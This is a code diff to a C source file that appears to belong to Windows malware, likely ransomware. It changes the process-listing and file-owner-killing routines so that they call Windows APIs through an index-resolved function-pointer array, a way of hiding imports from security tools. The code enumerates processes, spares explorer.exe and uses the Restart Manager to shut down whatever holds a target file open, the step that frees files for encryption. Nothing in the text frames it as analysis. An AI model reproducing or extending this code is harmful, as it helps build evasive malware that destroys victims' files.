@@ -1,5 +1,38 @@
 #include "File.h"
+
 EXPL_NODE* EXPLORER_ID_LL = NULL;
+
+extern FARPROC APIArray[52];
+
+MemeCreateToolhelp32Snapshot TempCreateToolhelp32Snapshot;
+MemeProcess32FirstW TempProcess32FirstW;
+MemelstrcmpiW TemplstrcmpiW;
+MemeProcess32NextW TempProcess32NextW;
+MemeCloseHandle TempCloseHandle1;
+MemeMultiByteToWideChar TempMultiByteToWideChar;
+MemeRmStartSession TempRmStartSession;
+MemeRmRegisterResources TempRmRegisterResources;
+MemeRmGetList TempRmGetList;
+MemeGetCurrentProcess TempGetCurrentProcess;
+MemeGetProcessId TempGetProcessId;
+MemeRmShutdown TempRmShutdown;
+MemeRmEndSession TempRmEndSession;
+
+void populateAPIFile() {
+	TempCreateToolhelp32Snapshot = (MemeCreateToolhelp32Snapshot)APIArray[17];
+	TempProcess32FirstW = (MemeProcess32FirstW)APIArray[18];
+	TemplstrcmpiW = (MemelstrcmpiW)APIArray[19];
+	TempProcess32NextW = (MemeProcess32NextW)APIArray[20];
+	TempCloseHandle1 = (MemeCloseHandle)APIArray[10];
+	TempMultiByteToWideChar = (MemeMultiByteToWideChar)APIArray[21];
+	TempRmStartSession = (MemeRmStartSession)APIArray[44];
+	TempRmRegisterResources = (MemeRmRegisterResources)APIArray[45];
+	TempRmGetList = (MemeRmGetList)APIArray[46];
+	TempGetCurrentProcess = (MemeGetCurrentProcess)APIArray[22];
+	TempGetProcessId = (MemeGetProcessId)APIArray[23];
+	TempRmShutdown = (MemeRmShutdown)APIArray[47];
+	TempRmEndSession = (MemeRmEndSession)APIArray[48];
+}
 
 void addNode(DWORD id) {
 	EXPL_NODE* tempNode = (EXPL_NODE*)calloc(sizeof(EXPL_NODE), 1);
@@ -29,25 +62,30 @@ void cleanExplorerLL() {
 }
 
 void findExplorerExe() {
-	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (!TempCreateToolhelp32Snapshot) {
+		populateAPIFile();
+	}
+	HANDLE hSnapshot = TempCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	PROCESSENTRY32W procEntry = PROCESSENTRY32W();
 	if (hSnapshot != INVALID_HANDLE_VALUE) {
 		procEntry.dwSize = sizeof(PROCESSENTRY32W);
-		if (Process32FirstW(hSnapshot, &procEntry)) {
+		if (TempProcess32FirstW(hSnapshot, &procEntry)) {
 			do {
-				if (!lstrcmpiW(procEntry.szExeFile, L"explorer.exe")) { // found explorer
+				if (!TemplstrcmpiW(procEntry.szExeFile, L"explorer.exe")) { // found explorer
 					addNode(procEntry.th32ProcessID);
 				}
-			} while (Process32NextW(hSnapshot, &procEntry));
+			} while (TempProcess32NextW(hSnapshot, &procEntry));
 		}
-		CloseHandle(hSnapshot);
+		TempCloseHandle1(hSnapshot);
 	}
 }
 
 // make sure findExplorerExe is called already
 // Kill all except explorer.exe
 void killFileOwner(LPSTR fileName) {
-
+	if (!TempCreateToolhelp32Snapshot) {
+		populateAPIFile();
+	}
 	DWORD sessionHandle = 0xFFFFFFFF;
 
 	WCHAR* strSessionKey = NULL;
@@ -63,13 +101,13 @@ void killFileOwner(LPSTR fileName) {
 	DWORD counter = 0;
 	DWORD result = 0;
 
-	convertResult = MultiByteToWideChar(CP_UTF8, 0, fileName, -1, NULL, 0);
+	convertResult = TempMultiByteToWideChar(CP_UTF8, 0, fileName, -1, NULL, 0);
 	LPWSTR wFileName = (LPWSTR)calloc(convertResult, sizeof(WCHAR));
 	if (!wFileName) {
 		goto CLEANUP;
 	}
 
-	convertResult = MultiByteToWideChar(CP_UTF8, 0, fileName, convertResult, wFileName, convertResult);
+	convertResult = TempMultiByteToWideChar(CP_UTF8, 0, fileName, convertResult, wFileName, convertResult);
 	if (convertResult <= 0) {
 		goto CLEANUP;
 	}
@@ -80,15 +118,15 @@ void killFileOwner(LPSTR fileName) {
 		goto CLEANUP;
 	}
 
-	if (RmStartSession(&sessionHandle, 0, strSessionKey) != ERROR_SUCCESS) {
+	if (TempRmStartSession(&sessionHandle, 0, strSessionKey) != ERROR_SUCCESS) {
 		goto CLEANUP;
 	}
 
-	if (RmRegisterResources(sessionHandle, 1, (LPCWSTR*)&wFileName, 0, NULL, 0, NULL) != ERROR_SUCCESS) {
+	if (TempRmRegisterResources(sessionHandle, 1, (LPCWSTR*)&wFileName, 0, NULL, 0, NULL) != ERROR_SUCCESS) {
 		goto CLEANUP;
 	}
 
-	result = RmGetList(sessionHandle, &procInfoNeeded, &procInfo, NULL, &dwRebootReasons);
+	result = TempRmGetList(sessionHandle, &procInfoNeeded, &procInfo, NULL, &dwRebootReasons);
 
 	if ((result == ERROR_MORE_DATA) && procInfoNeeded) {
 		rgAffectedApps = (RM_PROCESS_INFO*)malloc(sizeof(RM_PROCESS_INFO) * procInfoNeeded);
@@ -96,13 +134,13 @@ void killFileOwner(LPSTR fileName) {
 			goto CLEANUP;
 		}
 		procInfo = procInfoNeeded;
-		if (RmGetList(sessionHandle, &procInfoNeeded, &procInfo, rgAffectedApps, &dwRebootReasons) || !procInfoNeeded) {
+		if (TempRmGetList(sessionHandle, &procInfoNeeded, &procInfo, rgAffectedApps, &dwRebootReasons) || !procInfoNeeded) {
 			goto CLEANUP;
 		}
 
-		hCurrentProcess = GetCurrentProcess();
+		hCurrentProcess = TempGetCurrentProcess();
 
-		dwCurrentProcessID = GetProcessId(hCurrentProcess);
+		dwCurrentProcessID = TempGetProcessId(hCurrentProcess);
 
 		if (procInfo) {
 			affectedApp = rgAffectedApps;
@@ -129,20 +167,20 @@ void killFileOwner(LPSTR fileName) {
 			goto CLEANUP;
 		}
 	SHUTDOWN2:
-		RmShutdown(sessionHandle, 1, 0);
+		TempRmShutdown(sessionHandle, 1, 0);
 		goto CLEANUP;
 	}
 
 CLEANUP:
 	if (hCurrentProcess) {
-		CloseHandle(hCurrentProcess);
+		TempCloseHandle1(hCurrentProcess);
 	}
 
 	if (rgAffectedApps) {
 		free(rgAffectedApps);
 	}
 
-	RmEndSession(sessionHandle);
+	TempRmEndSession(sessionHandle);
 
 	if (wFileName) {
 		free((void*)wFileName);
